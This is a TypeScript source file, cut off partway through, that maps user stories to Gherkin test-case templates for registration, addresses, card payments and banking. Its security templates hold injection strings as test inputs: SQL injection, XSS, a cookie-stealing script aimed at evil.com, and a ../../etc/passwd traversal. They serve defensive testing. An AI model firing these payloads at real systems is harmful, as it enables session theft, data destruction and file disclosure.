/**
 * User Story Analyzer Engine
 *
 * A rules-based engine that parses user stories and generates
 * structured test cases with linked test data generator categories.
 * Each test case includes Gherkin steps and references to the
 * relevant QA Data Studio generator for producing test data.
 */

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------

export interface TestCase {
  id: string;
  title: string;
  category: "positive" | "negative" | "boundary" | "security";
  priority: "high" | "medium" | "low";
  gherkin: {
    given: string;
    when: string;
    then: string;
  };
  domain: string;
  generatorLink: string;
  dataFields: string[];
}

export interface DetectedDomain {
  domain: string;
  confidence: number;
  keywords: string[];
  generatorLink: string;
}

export interface AnalysisResult {
  userStory: string;
  detectedDomains: DetectedDomain[];
  testCases: TestCase[];
  summary: {
    totalCases: number;
    byCategory: Record<string, number>;
    byDomain: Record<string, number>;
    byPriority: Record<string, number>;
  };
}

// ---------------------------------------------------------------------------
// Domain configuration
// ---------------------------------------------------------------------------

interface DomainConfig {
  domain: string;
  generatorLink: string;
  keywords: string[];
  dataFields: string[];
}

const DOMAIN_CONFIGS: DomainConfig[] = [
  {
    domain: "user-profile",
    generatorLink: "/generators/user-profile",
    keywords: [
      "register",
      "sign up",
      "create account",
      "user",
      "profile",
      "name",
      "email",
      "phone",
      "password",
      "login",
      "authenticate",
      "signup",
      "log in",
      "sign in",
      "signin",
      "authentication",
      "credentials",
      "account",
      "username",
      "onboarding",
    ],
    dataFields: [
      "firstName",
      "lastName",
      "email",
      "phone",
      "username",
      "password",
      "dateOfBirth",
      "age",
      "gender",
      "ssn",
      "avatar",
    ],
  },
  {
    domain: "address",
    generatorLink: "/generators/address",
    keywords: [
      "address",
      "shipping",
      "delivery",
      "location",
      "city",
      "state",
      "zip",
      "country",
      "street",
      "postal",
      "mailing",
      "billing address",
      "ship to",
      "deliver to",
      "geolocation",
      "coordinates",
    ],
    dataFields: [
      "street",
      "city",
      "state",
      "zipCode",
      "country",
      "county",
      "latitude",
      "longitude",
      "fullAddress",
    ],
  },
  {
    domain: "credit-card",
    generatorLink: "/generators/credit-card",
    keywords: [
      "payment",
      "purchase",
      "buy",
      "checkout",
      "credit card",
      "card",
      "visa",
      "mastercard",
      "pay",
      "transaction",
      "billing",
      "charge",
      "refund",
      "subscription",
      "order",
      "cart",
    ],
    dataFields: [
      "cardNumber",
      "cardHolder",
      "expiryDate",
      "cvv",
      "network",
      "issuer",
    ],
  },
  {
    domain: "banking",
    generatorLink: "/generators/banking",
    keywords: [
      "bank",
      "transfer",
      "account",
      "balance",
      "routing",
      "iban",
      "swift",
      "deposit",
      "withdraw",
      "wire",
      "ach",
      "direct deposit",
      "savings",
      "checking",
      "financial",
      "funds",
    ],
    dataFields: [
      "bankName",
      "accountNumber",
      "routingNumber",
      "swiftCode",
      "iban",
      "accountType",
      "balance",
      "currency",
    ],
  },
  {
    domain: "json",
    generatorLink: "/generators/json",
    keywords: [
      "api",
      "endpoint",
      "request",
      "response",
      "json",
      "payload",
      "rest",
      "post",
      "get",
      "put",
      "delete",
      "patch",
      "webhook",
      "graphql",
      "microservice",
      "integration",
    ],
    dataFields: [
      "fieldName",
      "fieldType",
      "nestedObjects",
      "arrays",
      "nullableFields",
      "edgeCaseValues",
    ],
  },
  {
    domain: "schema",
    generatorLink: "/schema",
    keywords: [
      "data",
      "schema",
      "import",
      "csv",
      "table",
      "database",
      "sql",
      "query",
      "record",
      "column",
      "row",
      "migration",
      "seed",
      "export",
      "dataset",
      "bulk",
    ],
    dataFields: [
      "tableName",
      "columns",
      "dataTypes",
      "constraints",
      "relationships",
      "indexes",
    ],
  },
];

// ---------------------------------------------------------------------------
// Test case template library
// ---------------------------------------------------------------------------

interface TestCaseTemplate {
  title: string;
  category: "positive" | "negative" | "boundary" | "security";
  priority: "high" | "medium" | "low";
  gherkin: {
    given: string;
    when: string;
    then: string;
  };
  relevantFields: string[];
  /** Optional: only include this template when any of these keywords matched */
  contextKeywords?: string[];
}

const USER_PROFILE_TEMPLATES: TestCaseTemplate[] = [
  // ---- Positive ----
  {
    title: "Successful registration with valid email and strong password",
    category: "positive",
    priority: "high",
    gherkin: {
      given: "A new user is on the registration page",
      when: 'They enter a valid email "test@example.com" and a password meeting all strength requirements',
      then: "The account is created successfully and the user is redirected to the dashboard",
    },
    relevantFields: ["email", "password"],
    contextKeywords: ["register", "sign up", "create account", "signup"],
  },
  {
    title: "Successful login with valid credentials",
    category: "positive",
    priority: "high",
    gherkin: {
      given: "A registered user is on the login page",
      when: "They enter their correct email and password",
      then: "They are authenticated and redirected to their dashboard",
    },
    relevantFields: ["email", "password"],
    contextKeywords: ["login", "log in", "sign in", "signin", "authenticate"],
  },
  {
    title: "User profile displays correct personal information",
    category: "positive",
    priority: "medium",
    gherkin: {
      given: "A registered user is logged in and navigates to their profile page",
      when: "The profile page loads",
      then: "All personal information (name, email, phone) is displayed correctly",
    },
    relevantFields: ["firstName", "lastName", "email", "phone"],
    contextKeywords: ["profile", "user", "account"],
  },
  {
    title: "User updates profile information successfully",
    category: "positive",
    priority: "medium",
    gherkin: {
      given: "A registered user is on the profile edit page",
      when: "They update their first name, last name, and phone number with valid values",
      then: "The profile is updated and a success confirmation is shown",
    },
    relevantFields: ["firstName", "lastName", "phone"],
  },
  {
    title: "Registration with all optional fields populated",
    category: "positive",
    priority: "medium",
    gherkin: {
      given: "A new user is on the registration page",
      when: "They fill in all required and optional fields with valid data",
      then: "The account is created with all fields stored correctly",
    },
    relevantFields: [
      "firstName",
      "lastName",
      "email",
      "phone",
      "username",
      "password",
      "dateOfBirth",
    ],
    contextKeywords: ["register", "sign up", "create account", "signup"],
  },
  {
    title: "Password change with valid current and new password",
    category: "positive",
    priority: "high",
    gherkin: {
      given: "A logged-in user is on the change password page",
      when: "They enter their current password correctly and provide a new password meeting requirements",
      then: "The password is updated and the user is notified of the change",
    },
    relevantFields: ["password"],
    contextKeywords: ["password"],
  },
  {
    title: "User registration with international phone number",
    category: "positive",
    priority: "low",
    gherkin: {
      given: 'A new user from the UK is on the registration page',
      when: 'They enter a phone number in international format "+44 20 7946 0958"',
      then: "The phone number is accepted and stored in normalized format",
    },
    relevantFields: ["phone"],
    contextKeywords: ["register", "sign up", "phone"],
  },
  {
    title: "User searches for another user by username",
    category: "positive",
    priority: "low",
    gherkin: {
      given: "A logged-in user is on the user search page",
      when: 'They search for a username that exists in the system',
      then: "The matching user profile is displayed in search results",
    },
    relevantFields: ["username"],
    contextKeywords: ["user", "profile", "username"],
  },
  // ---- Negative ----
  {
    title: "Registration fails with already registered email",
    category: "negative",
    priority: "high",
    gherkin: {
      given: "An email address that is already registered in the system",
      when: "A new user attempts to register with the same email",
      then: 'An error message "Email already in use" is displayed and registration is blocked',
    },
    relevantFields: ["email"],
    contextKeywords: ["register", "sign up", "create account", "signup"],
  },
  {
    title: "Login fails with incorrect password",
    category: "negative",
    priority: "high",
    gherkin: {
      given: "A registered user is on the login page",
      when: "They enter their correct email but an incorrect password",
      then: 'An error message "Invalid email or password" is displayed',
    },
    relevantFields: ["email", "password"],
    contextKeywords: ["login", "log in", "sign in", "signin", "authenticate"],
  },
  {
    title: "Registration fails with invalid email format",
    category: "negative",
    priority: "high",
    gherkin: {
      given: "A new user is on the registration page",
      when: 'They enter an invalid email format such as "user@" or "user.com"',
      then: "A validation error is shown indicating the email format is invalid",
    },
    relevantFields: ["email"],
  },
  {
    title: "Registration fails with weak password",
    category: "negative",
    priority: "high",
    gherkin: {
      given: "A new user is on the registration page",
      when: 'They enter a password that is too short or lacks required characters (e.g., "abc")',
      then: "A validation error lists the unmet password requirements",
    },
    relevantFields: ["password"],
    contextKeywords: ["register", "sign up", "password"],
  },
  {
    title: "Registration fails when required fields are empty",
    category: "negative",
    priority: "high",
    gherkin: {
      given: "A new user is on the registration page",
      when: "They submit the form without filling in any required fields",
      then: "Validation errors are shown for each required field",
    },
    relevantFields: ["firstName", "lastName", "email", "password"],
    contextKeywords: ["register", "sign up", "create account", "signup"],
  },
  {
    title: "Login fails with non-existent email",
    category: "negative",
    priority: "medium",
    gherkin: {
      given: "A user is on the login page",
      when: "They enter an email that does not exist in the system",
      then: 'A generic error "Invalid email or password" is displayed without revealing whether the email exists',
    },
    relevantFields: ["email"],
    contextKeywords: ["login", "log in", "sign in", "signin", "authenticate"],
  },
  {
    title: "Profile update fails with invalid phone number",
    category: "negative",
    priority: "medium",
    gherkin: {
      given: "A logged-in user is editing their profile",
      when: 'They enter an invalid phone number such as "abc123"',
      then: "A validation error indicates the phone number format is invalid",
    },
    relevantFields: ["phone"],
  },
  {
    title: "Registration fails with mismatched password confirmation",
    category: "negative",
    priority: "medium",
    gherkin: {
      given: "A new user is on the registration page",
      when: "They enter a password and a different value in the confirm password field",
      then: 'A validation error "Passwords do not match" is displayed',
    },
    relevantFields: ["password"],
    contextKeywords: ["register", "sign up", "create account", "signup"],
  },
  {
    title: "Account access denied after too many failed login attempts",
    category: "negative",
    priority: "high",
    gherkin: {
      given: "A user has failed to log in 5 consecutive times",
      when: "They attempt a 6th login",
      then: "The account is temporarily locked and a lockout message with retry time is displayed",
    },
    relevantFields: ["email", "password"],
    contextKeywords: ["login", "log in", "sign in", "authenticate"],
  },
  // ---- Boundary ----
  {
    title: "Registration with minimum length password",
    category: "boundary",
    priority: "medium",
    gherkin: {
      given: "A new user is on the registration page",
      when: "They enter a password at the exact minimum required length (e.g., 8 characters)",
      then: "The password is accepted and the account is created",
    },
    relevantFields: ["password"],
    contextKeywords: ["register", "sign up", "password"],
  },
  {
    title: "Registration with maximum length email (254 characters)",
    category: "boundary",
    priority: "medium",
    gherkin: {
      given: "A new user is on the registration page",
      when: "They enter an email at the maximum allowed length of 254 characters",
      then: "The email is accepted and registration succeeds without truncation",
    },
    relevantFields: ["email"],
  },
  {
    title: "Profile update with single character first name",
    category: "boundary",
    priority: "low",
    gherkin: {
      given: 'A logged-in user is editing their profile',
      when: 'They set their first name to a single character "A"',
      then: "The name is accepted if it meets the minimum length requirement, or rejected with an appropriate error",
    },
    relevantFields: ["firstName"],
  },
  {
    title: "Username at maximum allowed length",
    category: "boundary",
    priority: "low",
    gherkin: {
      given: "A new user is on the registration page",
      when: "They enter a username at the maximum allowed length (e.g., 30 characters)",
      then: "The username is accepted and stored without truncation",
    },
    relevantFields: ["username"],
    contextKeywords: ["register", "sign up", "username"],
  },
  {
    title: "Registration with email containing special valid characters",
    category: "boundary",
    priority: "medium",
    gherkin: {
      given: "A new user is on the registration page",
      when: 'They enter an email with valid special characters like "user+tag@example.com" or "user.name@example.com"',
      then: "The email is accepted as it conforms to RFC 5322",
    },
    relevantFields: ["email"],
  },
  {
    title: "Phone number with country code and maximum digits",
    category: "boundary",
    priority: "low",
    gherkin: {
      given: "A user is entering their phone number",
      when: "They enter a phone number with country code totaling 15 digits (E.164 maximum)",
      then: "The phone number is accepted and stored correctly",
    },
    relevantFields: ["phone"],
  },
  {
    title: "Date of birth at minimum allowed age",
    category: "boundary",
    priority: "medium",
    gherkin: {
      given: "A new user is on the registration page",
      when: "They enter a date of birth that makes them exactly the minimum required age (e.g., 13 years old today)",
      then: "The registration is accepted",
    },
    relevantFields: ["dateOfBirth", "age"],
    contextKeywords: ["register", "sign up", "create account"],
  },
  {
    title: "Password at maximum allowed length",
    category: "boundary",
    priority: "low",
    gherkin: {
      given: "A new user is on the registration page",
      when: "They enter a password at the maximum allowed length (e.g., 128 characters)",
      then: "The password is accepted and the user can log in with it",
    },
    relevantFields: ["password"],
  },
  // ---- Security ----
  {
    title: "SQL injection attempt in email field",
    category: "security",
    priority: "high",
    gherkin: {
      given: "A malicious user is on the registration page",
      when: "They enter \"admin'--@test.com\" in the email field",
      then: "The input is sanitized, the registration fails with a validation error, and no SQL is executed",
    },
    relevantFields: ["email"],
  },
  {
    title: "XSS script injection in name fields",
    category: "security",
    priority: "high",
    gherkin: {
      given: "A malicious user is editing their profile",
      when: 'They enter "<script>alert(document.cookie)</script>" as their first name',
      then: "The HTML is escaped or stripped, and the script does not execute when the profile is viewed",
    },
    relevantFields: ["firstName", "lastName"],
  },
  {
    title: "SQL injection attempt in login password field",
    category: "security",
    priority: "high",
    gherkin: {
      given: "A malicious user is on the login page",
      when: "They enter \"' OR '1'='1\" in the password field",
      then: "Authentication fails with a generic error and no unauthorized access is granted",
    },
    relevantFields: ["password"],
    contextKeywords: ["login", "log in", "sign in", "authenticate"],
  },
  {
    title: "CSRF token validation on registration form",
    category: "security",
    priority: "high",
    gherkin: {
      given: "A malicious actor crafts a fake registration form on an external site",
      when: "The form is submitted to the registration endpoint without a valid CSRF token",
      then: "The request is rejected with a 403 Forbidden error",
    },
    relevantFields: ["email", "password"],
    contextKeywords: ["register", "sign up", "create account"],
  },
  {
    title: "Password not exposed in API response",
    category: "security",
    priority: "high",
    gherkin: {
      given: "A user has successfully registered or logged in",
      when: "The API returns the user profile data",
      then: "The password field is not present in the response body",
    },
    relevantFields: ["password"],
  },
  {
    title: "Brute force protection on login endpoint",
    category: "security",
    priority: "high",
    gherkin: {
      given: "An attacker sends rapid automated login requests",
      when: "More than 10 requests are made within 1 minute from the same IP",
      then: "Rate limiting is enforced and further requests receive 429 Too Many Requests",
    },
    relevantFields: ["email", "password"],
    contextKeywords: ["login", "log in", "sign in", "authenticate"],
  },
  {
    title: "Session fixation prevention after login",
    category: "security",
    priority: "medium",
    gherkin: {
      given: "A user has an existing session ID before logging in",
      when: "They successfully authenticate",
      then: "A new session ID is issued and the old session is invalidated",
    },
    relevantFields: ["email", "password"],
    contextKeywords: ["login", "log in", "sign in", "authenticate"],
  },
  {
    title: "Stored XSS via username field",
    category: "security",
    priority: "high",
    gherkin: {
      given: "A malicious user is on the registration page",
      when: "They enter '<img src=x onerror=alert(1)>' as their username",
      then: "The HTML is sanitized and does not execute when other users view the username",
    },
    relevantFields: ["username"],
  },
];

const ADDRESS_TEMPLATES: TestCaseTemplate[] = [
  // ---- Positive ----
  {
    title: "Shipping address saved with all valid fields",
    category: "positive",
    priority: "high",
    gherkin: {
      given: "A user is on the shipping address form during checkout",
      when: "They enter a valid street, city, state, zip code, and country",
      then: "The address is saved and displayed in the order summary",
    },
    relevantFields: ["street", "city", "state", "zipCode", "country"],
    contextKeywords: ["shipping", "delivery", "checkout"],
  },
  {
    title: "Address auto-complete suggests valid addresses",
    category: "positive",
    priority: "medium",
    gherkin: {
      given: "A user starts typing a street address",
      when: "They type at least 3 characters of a valid street name",
      then: "Auto-complete suggestions appear with matching addresses",
    },
    relevantFields: ["street", "city", "state"],
    contextKeywords: ["address"],
  },
  {
    title: "User adds a new delivery address to their address book",
    category: "positive",
    priority: "medium",
    gherkin: {
      given: "A logged-in user is on their address book page",
      when: "They fill in a new address with all required fields and click Save",
      then: "The address is added to their address book and available for future orders",
    },
    relevantFields: ["street", "city", "state", "zipCode", "country"],
    contextKeywords: ["address", "delivery"],
  },
  {
    title: "Address form pre-fills country based on user locale",
    category: "positive",
    priority: "low",
    gherkin: {
      given: "A user from the United States accesses the address form",
      when: "The form loads",
      then: 'The country field is pre-filled with "United States"',
    },
    relevantFields: ["country"],
  },
  {
    title: "Zip code lookup populates city and state",
    category: "positive",
    priority: "medium",
    gherkin: {
      given: "A user is filling out the address form",
      when: 'They enter a valid zip code such as "90210"',
      then: 'The city is populated with "Beverly Hills" and state with "CA"',
    },
    relevantFields: ["zipCode", "city", "state"],
  },
  {
    title: "User sets a default shipping address",
    category: "positive",
    priority: "medium",
    gherkin: {
      given: "A user has multiple saved addresses",
      when: "They mark one address as the default shipping address",
      then: "That address is pre-selected during checkout",
    },
    relevantFields: ["street", "city", "state", "zipCode", "country"],
    contextKeywords: ["shipping", "address"],
  },
  // ---- Negative ----
  {
    title: "Address submission fails with missing required street",
    category: "negative",
    priority: "high",
    gherkin: {
      given: "A user is on the address form",
      when: "They submit the form with the street field left empty",
      then: 'A validation error "Street address is required" is displayed',
    },
    relevantFields: ["street"],
  },
  {
    title: "Invalid zip code format is rejected",
    category: "negative",
    priority: "high",
    gherkin: {
      given: "A user is entering a US shipping address",
      when: 'They enter "ABCDE" in the zip code field',
      then: "A validation error indicates the zip code format is invalid",
    },
    relevantFields: ["zipCode"],
  },
  {
    title: "State and zip code mismatch is flagged",
    category: "negative",
    priority: "medium",
    gherkin: {
      given: "A user is entering a shipping address",
      when: 'They select state "California" but enter zip code "10001" (New York)',
      then: "A warning or error indicates the state and zip code do not match",
    },
    relevantFields: ["state", "zipCode"],
  },
  {
    title: "Address submission fails when all fields are empty",
    category: "negative",
    priority: "high",
    gherkin: {
      given: "A user is on the address form",
      when: "They click Save without entering any information",
      then: "Validation errors appear for all required fields",
    },
    relevantFields: ["street", "city", "state", "zipCode", "country"],
  },
  {
    title: "Unsupported country is rejected",
    category: "negative",
    priority: "medium",
    gherkin: {
      given: "A user is entering a shipping address",
      when: "They select a country that is not in the supported shipping destinations",
      then: 'An error "Shipping is not available to this country" is shown',
    },
    relevantFields: ["country"],
    contextKeywords: ["shipping", "delivery"],
  },
  {
    title: "PO Box rejected for physical delivery requirement",
    category: "negative",
    priority: "medium",
    gherkin: {
      given: "A user is entering a shipping address for a large item",
      when: 'They enter "PO Box 1234" as the street address',
      then: 'An error "PO Box addresses are not accepted for this delivery type" is displayed',
    },
    relevantFields: ["street"],
    contextKeywords: ["shipping", "delivery"],
  },
  // ---- Boundary ----
  {
    title: "Street address at maximum character limit",
    category: "boundary",
    priority: "medium",
    gherkin: {
      given: "A user is entering a street address",
      when: "They type an address that reaches the maximum allowed length (e.g., 100 characters)",
      then: "The full address is accepted without truncation",
    },
    relevantFields: ["street"],
  },
  {
    title: "City name with hyphens and apostrophes",
    category: "boundary",
    priority: "low",
    gherkin: {
      given: "A user is entering a city name",
      when: "They enter a city with special characters like \"Winston-Salem\" or \"O'Fallon\"",
      then: "The city name is accepted and stored correctly",
    },
    relevantFields: ["city"],
  },
  {
    title: "Zip code with leading zeros",
    category: "boundary",
    priority: "medium",
    gherkin: {
      given: "A user is entering a US address in the Northeast",
      when: 'They enter zip code "01001" (Agawam, MA)',
      then: "The leading zero is preserved and the zip code is stored as a string",
    },
    relevantFields: ["zipCode"],
  },
  {
    title: "Address with Unicode characters in street name",
    category: "boundary",
    priority: "low",
    gherkin: {
      given: "A user is entering an international address",
      when: "They enter a street name containing accented or non-Latin characters",
      then: "The characters are stored and displayed correctly without encoding issues",
    },
    relevantFields: ["street", "city"],
  },
  {
    title: "Extended zip code format (ZIP+4)",
    category: "boundary",
    priority: "low",
    gherkin: {
      given: "A user is entering a US address",
      when: 'They enter a ZIP+4 code like "90210-1234"',
      then: "The extended zip code is accepted and validated",
    },
    relevantFields: ["zipCode"],
  },
  {
    title: "Minimum length city name",
    category: "boundary",
    priority: "low",
    gherkin: {
      given: "A user is entering a city name",
      when: 'They enter a very short city name like "Ai" (a real city in Japan)',
      then: "The city name is accepted if it meets the minimum length requirement",
    },
    relevantFields: ["city"],
  },
  // ---- Security ----
  {
    title: "XSS injection in street address field",
    category: "security",
    priority: "high",
    gherkin: {
      given: "A malicious user is on the address form",
      when: 'They enter "<script>document.location=\'http://evil.com?c=\'+document.cookie</script>" as the street',
      then: "The input is sanitized and no script executes when the address is displayed",
    },
    relevantFields: ["street"],
  },
  {
    title: "SQL injection in city field",
    category: "security",
    priority: "high",
    gherkin: {
      given: "A malicious user is on the address form",
      when: "They enter \"'; DROP TABLE addresses;--\" in the city field",
      then: "The input is parameterized, no SQL is executed, and a validation error is shown",
    },
    relevantFields: ["city"],
  },
  {
    title: "IDOR attempt to modify another user address",
    category: "security",
    priority: "high",
    gherkin: {
      given: "A malicious user captures the address update API request",
      when: "They change the address ID to another user's address ID and replay the request",
      then: "The server returns 403 Forbidden and the other user's address remains unchanged",
    },
    relevantFields: ["street", "city", "state", "zipCode"],
  },
  {
    title: "HTML injection in country field",
    category: "security",
    priority: "medium",
    gherkin: {
      given: "A malicious user is on the address form",
      when: 'They enter "<b onmouseover=alert(1)>hover</b>" in the country field',
      then: "The HTML is stripped and the input is treated as plain text",
    },
    relevantFields: ["country"],
  },
  {
    title: "Path traversal attempt in address API endpoint",
    category: "security",
    priority: "high",
    gherkin: {
      given: "A malicious user is accessing the address API",
      when: "They include \"../../etc/passwd\" in the address lookup parameter",
      then: "The server rejects the request and returns a 400 Bad Request",
    },
    relevantFields: ["street"],
  },
  {
    title: "Mass assignment attack on address update",
    category: "security",
    priority: "medium",
    gherkin: {
      given: "A malicious user sends an address update request",
      when: "They include additional fields like \"userId\" or \"isVerified\" in the payload",
      then: "The extra fields are ignored and only whitelisted address fields are updated",
    },
    relevantFields: ["street", "city", "state", "zipCode", "country"],
  },
];

const CREDIT_CARD_TEMPLATES: TestCaseTemplate[] = [
  // ---- Positive ----
  {
    title: "Successful payment with valid Visa card",
    category: "positive",
    priority: "high",
    gherkin: {
      given: "A user is on the payment page during checkout",
      when: "They enter a valid Visa card number, expiry date, and CVV",
      then: "The payment is processed successfully and a confirmation is shown",
    },
    relevantFields: ["cardNumber", "expiryDate", "cvv", "network"],
    contextKeywords: ["payment", "checkout", "purchase", "buy", "pay"],
  },
  {
    title: "Payment with Mastercard processes correctly",
    category: "positive",
    priority: "high",
    gherkin: {
      given: "A user is on the payment page",
      when: "They enter a valid Mastercard number with correct expiry and CVV",
      then: "The payment is authorized and the order is confirmed",
    },
    relevantFields: ["cardNumber", "expiryDate", "cvv", "network"],
    contextKeywords: ["payment", "mastercard", "pay"],
  },
  {
    title: "Saved card is used for repeat purchase",
    category: "positive",
    priority: "medium",
    gherkin: {
      given: "A user has a previously saved credit card on file",
      when: "They select the saved card and enter the CVV",
      then: "The payment processes using the saved card details",
    },
    relevantFields: ["cardNumber", "cvv"],
    contextKeywords: ["payment", "purchase", "card"],
  },
  {
    title: "Card details are masked after entry",
    category: "positive",
    priority: "medium",
    gherkin: {
      given: "A user has entered their credit card number",
      when: "They move to the next field",
      then: "The card number is masked showing only the last 4 digits",
    },
    relevantFields: ["cardNumber"],
  },
  {
    title: "Payment with card in different currency converts correctly",
    category: "positive",
    priority: "low",
    gherkin: {
      given: "A user with a EUR-denominated card is purchasing in USD",
      when: "They complete the payment",
      then: "The currency conversion is shown and the payment processes at the converted amount",
    },
    relevantFields: ["cardNumber", "expiryDate", "cvv"],
    contextKeywords: ["payment", "purchase"],
  },
  {
    title: "Refund processed back to the original payment card",
    category: "positive",
    priority: "high",
    gherkin: {
      given: "A user has a completed order paid by credit card",
      when: "They request a refund and it is approved",
      then: "The refund amount is credited back to the original card",
    },
    relevantFields: ["cardNumber", "network"],
    contextKeywords: ["refund", "payment"],
  },
  // ---- Negative ----
  {
    title: "Payment fails with expired credit card",
    category: "negative",
    priority: "high",
    gherkin: {
      given: "A user is on the payment page",
      when: "They enter a card with an expiry date in the past",
      then: 'An error "Card has expired" is displayed and payment is not processed',
    },
    relevantFields: ["expiryDate"],
  },
  {
    title: "Payment fails with invalid card number (Luhn check)",
    category: "negative",
    priority: "high",
    gherkin: {
      given: "A user is on the payment page",
      when: "They enter a card number that fails Luhn validation",
      then: "A validation error indicates the card number is invalid",
    },
    relevantFields: ["cardNumber"],
  },
  {
    title: "Payment fails with incorrect CVV",
    category: "negative",
    priority: "high",
    gherkin: {
      given: "A user is on the payment page",
      when: "They enter a valid card number but an incorrect CVV",
      then: "The payment is declined with an error message",
    },
    relevantFields: ["cvv"],
  },
  {
    title: "Payment fails with insufficient funds",
    category: "negative",
    priority: "high",
    gherkin: {
      given: "A user is on the payment page with an order total exceeding their card limit",
      when: "They submit the payment",
      then: 'The payment is declined with "Insufficient funds" error',
    },
    relevantFields: ["cardNumber", "expiryDate", "cvv"],
    contextKeywords: ["payment", "purchase", "checkout"],
  },
  {
    title: "Card number field rejects non-numeric input",
    category: "negative",
    priority: "medium",
    gherkin: {
      given: "A user is on the payment page",
      when: 'They enter alphabetic characters "abcd-efgh-ijkl-mnop" in the card number field',
      then: "The input is rejected and only numeric characters are allowed",
    },
    relevantFields: ["cardNumber"],
  },
  {
    title: "Payment fails when cardholder name is empty",
    category: "negative",
    priority: "medium",
    gherkin: {
      given: "A user is on the payment page",
      when: "They leave the cardholder name field empty and submit",
      then: 'A validation error "Cardholder name is required" is shown',
    },
    relevantFields: ["cardHolder"],
  },
  {
    title: "CVV field rejects more than 4 digits",
    category: "negative",
    priority: "medium",
    gherkin: {
      given: "A user is entering payment details for a Visa card",
      when: 'They enter "12345" in the CVV field',
      then: "The field only accepts up to 3 digits for Visa (4 for Amex)",
    },
    relevantFields: ["cvv", "network"],
  },
  {
    title: "Payment declined for card reported stolen",
    category: "negative",
    priority: "high",
    gherkin: {
      given: "A user is using a card flagged as stolen by the issuer",
      when: "They attempt to process a payment",
      then: "The payment is declined and the transaction is flagged for review",
    },
    relevantFields: ["cardNumber"],
    contextKeywords: ["payment", "purchase"],
  },
  // ---- Boundary ----
  {
    title: "Card number with exactly 16 digits accepted",
    category: "boundary",
    priority: "medium",
    gherkin: {
      given: "A user is entering a Visa/Mastercard number",
      when: "They enter exactly 16 digits that pass Luhn validation",
      then: "The card number is accepted",
    },
    relevantFields: ["cardNumber"],
  },
  {
    title: "Amex card number with 15 digits accepted",
    category: "boundary",
    priority: "medium",
    gherkin: {
      given: "A user is paying with an American Express card",
      when: "They enter a valid 15-digit Amex card number",
      then: "The card number is accepted and Amex is detected as the network",
    },
    relevantFields: ["cardNumber", "network"],
  },
  {
    title: "Card expiry in the current month is accepted",
    category: "boundary",
    priority: "high",
    gherkin: {
      given: "A user is entering card details",
      when: "They enter an expiry date that matches the current month and year",
      then: "The card is accepted as it has not yet expired",
    },
    relevantFields: ["expiryDate"],
  },
  {
    title: "CVV with leading zeros",
    category: "boundary",
    priority: "low",
    gherkin: {
      given: "A user is entering payment details",
      when: 'They enter CVV "001"',
      then: "The leading zeros are preserved and the CVV is valid",
    },
    relevantFields: ["cvv"],
  },
  {
    title: "Cardholder name with hyphen and apostrophe",
    category: "boundary",
    priority: "low",
    gherkin: {
      given: "A user is entering their cardholder name",
      when: "They enter \"Mary-Jane O'Brien\" as the cardholder name",
      then: "The name is accepted with special characters intact",
    },
    relevantFields: ["cardHolder"],
  },
  {
    title: "Payment amount at the maximum allowed transaction limit",
    category: "boundary",
    priority: "medium",
    gherkin: {
      given: "A user is making a high-value purchase at the transaction limit",
      when: "They submit a payment for exactly $9,999.99 (the system maximum)",
      then: "The payment is processed successfully at the limit amount",
    },
    relevantFields: ["cardNumber", "expiryDate", "cvv"],
    contextKeywords: ["payment", "purchase"],
  },
  // ---- Security ----
  {
    title: "Card number not logged in application logs",
    category: "security",
    priority: "high",
    gherkin: {
      given: "A user submits a payment with their credit card",
      when: "The transaction is processed",
      then: "The full card number does not appear in any application logs or error messages",
    },
    relevantFields: ["cardNumber"],
  },
  {
    title: "Card data transmitted over HTTPS only",
    category: "security",
    priority: "high",
    gherkin: {
      given: "A user is on the payment page",
      when: "They submit their card details",
      then: "The data is transmitted over TLS/HTTPS and no plaintext card data is sent over HTTP",
    },
    relevantFields: ["cardNumber", "cvv", "expiryDate"],
  },
  {
    title: "CVV not stored after transaction",
    category: "security",
    priority: "high",
    gherkin: {
      given: "A payment has been successfully processed",
      when: "The transaction record is saved",
      then: "The CVV is not stored in the database or any persistent storage (PCI DSS compliance)",
    },
    relevantFields: ["cvv"],
  },
  {
    title: "XSS attempt in cardholder name field",
    category: "security",
    priority: "high",
    gherkin: {
      given: "A malicious user is on the payment page",
      when: "They enter '<script>steal(document.cookie)</script>' as the cardholder name",
      then: "The input is sanitized and no script executes on the confirmation or receipt page",
    },
    relevantFields: ["cardHolder"],
  },
  {
    title: "Card skimming protection via iframe isolation",
    category: "security",
    priority: "medium",
    gherkin: {
      given: "The payment form is loaded on the checkout page",
      when: "A user enters card details",
      then: "Card fields are isolated in a PCI-compliant iframe and the parent page cannot access the values",
    },
    relevantFields: ["cardNumber", "cvv", "expiryDate"],
  },
  {
    title: "Replay attack prevention on payment endpoint",
    category: "security",
    priority: "high",
    gherkin: {
      given: "A malicious user captures a successful payment API request",
      when: "They replay the exact same request",
      then: "The server detects the duplicate idempotency key and rejects the replayed request",
    },
    relevantFields: ["cardNumber", "expiryDate", "cvv"],
    contextKeywords: ["payment", "purchase"],
  },
];

const BANKING_TEMPLATES: TestCaseTemplate[] = [
  // ---- Positive ----
  {
    title: "Successful fund transfer between accounts",
    category: "positive",
    priority: "high",
    gherkin: {
      given: "A user is on the transfer funds page with sufficient balance",
      when: "They enter a valid destination account number, routing number, and transfer amount",
      then: "The transfer is executed, balance is updated, and a confirmation with reference number is shown",
    },
    relevantFields: [
      "accountNumber",
      "routingNumber",
      "balance",
      "currency",
    ],
    contextKeywords: ["transfer", "bank"],
  },
  {
    title: "Account balance displayed correctly after deposit",
    category: "positive",
    priority: "high",
    gherkin: {
      given: "A user has a checking account with a known balance",
      when: "They make a deposit of $500.00",
      then: "The account balance increases by exactly $500.00 and the transaction appears in history",
    },
    relevantFields: ["balance", "accountType", "currency"],
    contextKeywords: ["deposit", "balance"],
  },
  {
    title: "International wire transfer with valid IBAN and SWIFT",
    category: "positive",
    priority: "medium",
    gherkin: {
      given: "A user is initiating an international wire transfer",
      when: "They enter a valid IBAN and SWIFT/BIC code for the destination",
      then: "The transfer is queued, fees are displayed, and a confirmation is provided",
    },
    relevantFields: ["iban", "swiftCode", "balance", "currency"],
    contextKeywords: ["transfer", "iban", "swift", "wire"],
  },
  {
    title: "Account statement generation for date range",
    category: "positive",
    priority: "medium",
    gherkin: {
      given: "A user is on the account statements page",
      when: "They select a valid date range and request a statement",
      then: "A statement is generated showing all transactions within the range",
    },
    relevantFields: ["accountNumber", "balance", "currency"],
    contextKeywords: ["account", "bank"],
  },
  {
    title: "Withdrawal from ATM with valid PIN",
    category: "positive",
    priority: "high",
